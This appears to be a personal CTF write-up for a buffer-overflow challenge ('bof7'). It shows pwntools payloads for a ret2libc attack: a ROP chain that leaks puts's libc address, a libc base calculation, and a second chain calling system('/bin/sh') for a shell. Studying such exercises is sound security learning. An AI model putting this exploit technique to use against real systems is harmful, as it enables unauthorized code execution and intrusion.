- `checksec`
  ![[bof7_JHT-1.png]]
- decompile:
  ![[bof7_JHT-2.png]]
- NX on, no canary, only `main()` -> [[ret2libc]] + [[ROP]]
- step 1: leak libc addr via `puts` using ROP, then ret to main (loop)
- payload:
  ```python
	main_addr = 0x4011bd
	puts_got_plt = 0x403fd8
	puts_plt = 0x401060
	pop_rdi_ret = 0x401263
	ret_addr = 0x40101a
	
	payload = b'A'*88 + p64(pop_rdi_ret) + p64(puts_got_plt) + p64(puts_plt) + p64(main_addr)
	payload = payload.ljust(120, b'\x90')
	p.sendafter(b'Say something: \n', payload)
  ```
- step 2: cal libc base addr
- find offset:
  ![[bof7_JHT-3.png]]
  ![[bof7_JHT-4.png]]
- payload:
  ```python
	offset = 0x805a0
	leak = u64(p.recv(6).ljust(8, b'\x00'))
	libc_base = leak - offset
	log.info(f'leak: {hex(leak)}')
	log.info(f'libc base: {hex(libc_base)}')
  ```
- step 3: execute system("/bin/sh")
- find system and "/bin/sh" in libc:
  ![[bof7_JHT-5.png]]
- payload: 
  ```python
	system_addr = 0x53110 + libc_base
	bin_sh_addr = 0x1a7ea4 + libc_base
	p.sendafter(b'Say something: \n', b'A'*88 + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr))
  ```